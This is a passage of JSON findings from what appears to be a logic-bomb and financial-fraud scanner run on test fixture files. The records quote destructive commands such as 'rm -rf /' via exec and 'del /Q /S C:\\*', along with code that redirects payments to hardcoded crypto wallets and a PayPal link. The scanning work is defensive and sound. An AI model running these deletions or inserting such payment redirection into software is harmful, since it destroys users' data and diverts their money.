    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.469545"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.470546",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "e4bf975a-28c7-464d-895c-3ba76a3a522f",
    "last_modified": "",
    "line_number": 114,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.470546"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
    "column": 31,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.470546",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "fc4d48e2-9173-4e7b-8b38-22f374054757",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.470546"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.470546",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "11baa432-0e7f-4e40-a51e-b74d2acab41d",
    "last_modified": "",
    "line_number": 120,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.470546"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.471548",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "2da52355-7ed6-4df1-a89a-2ef2e6c2f1ee",
    "last_modified": "",
    "line_number": 162,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.471548"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
    "column": 39,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.471548",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "7b053382-820c-41be-b1d5-0f4d8fc1743a",
    "last_modified": "",
    "line_number": 201,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.471548"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.472548",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "73d2d78d-e080-4121-8df5-ebb8cad42504",
    "last_modified": "",
    "line_number": 215,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.472548"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.473544",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "1f0ddc71-87c3-4293-8e3f-443f4db21d9e",
    "last_modified": "",
    "line_number": 217,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.473544"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.473544",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "6ee5d8a3-1f91-4c78-90f4-30d0d9edca24",
    "last_modified": "",
    "line_number": 218,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.473544"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_folder')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.482541",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "5106c659-108d-4df2-873e-845d7cdedeb1",
    "last_modified": "",
    "line_number": 8,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.482541"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('del /Q /S C:\\\\*')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.482541",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "f6dd2485-abb5-4896-ab65-0f66dc7efa00",
    "last_modified": "",
    "line_number": 9,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.482541"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.482541",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "62c35ea8-e395-4f8a-9a1a-6c2490861364",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.482541"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.483541",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "954a6ec5-a353-487c-880b-26a4d08ae583",
    "last_modified": "",
    "line_number": 16,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-13T22:21:33.483541"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payment to developer account",
    "column": 11,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.577543",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "49faa1e3-e0ff-4a88-8933-50fbf9a6995f",
    "last_modified": "",
    "line_number": 10,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.577543"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.577543",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "5b9d4b7e-cb57-4450-8d4a-c70d357a614d",
    "last_modified": "",
    "line_number": 22,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.577543"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.577543",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "78cace27-9e68-4562-bc7c-b0d1f398312d",
    "last_modified": "",
    "line_number": 23,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.577543"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.578547",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "8ce07e8f-f28c-41a1-afca-5aad36d33aab",
    "last_modified": "",
    "line_number": 27,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.578547"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.578547",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "766e329f-7e87-43fa-82fc-90a58bb6eddd",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.578547"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def transfer_crypto(amount, wallet):",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.603544",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "8b2dcfb0-b9c2-4dae-9ffb-3f0205f73d6d",
    "last_modified": "",
    "line_number": 41,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.603544"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
    "column": 20,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.604546",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "e20edbd8-b996-4cee-85c8-adb3c422e18e",
    "last_modified": "",
    "line_number": 42,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.604546"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def redirect_payment(amount, paypal):",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.605543",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "2e8044e0-ff8c-4d0b-b073-6c3c39d7f466",
    "last_modified": "",
    "line_number": 45,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.605543"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
    "column": 7,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.606545",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "5e06745e-eb57-4942-a4c4-fa7cfd4e8d8a",
    "last_modified": "",
    "line_number": 54,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-13T22:21:33.606545"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-13T22:21:33.607547",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "54c4040f-b763-4f1a-8663-cae2f7ee7d88",
    "last_modified": "",
    "line_number": 56,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "e60844a6-7d97-4321-84e3-672669256bbc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
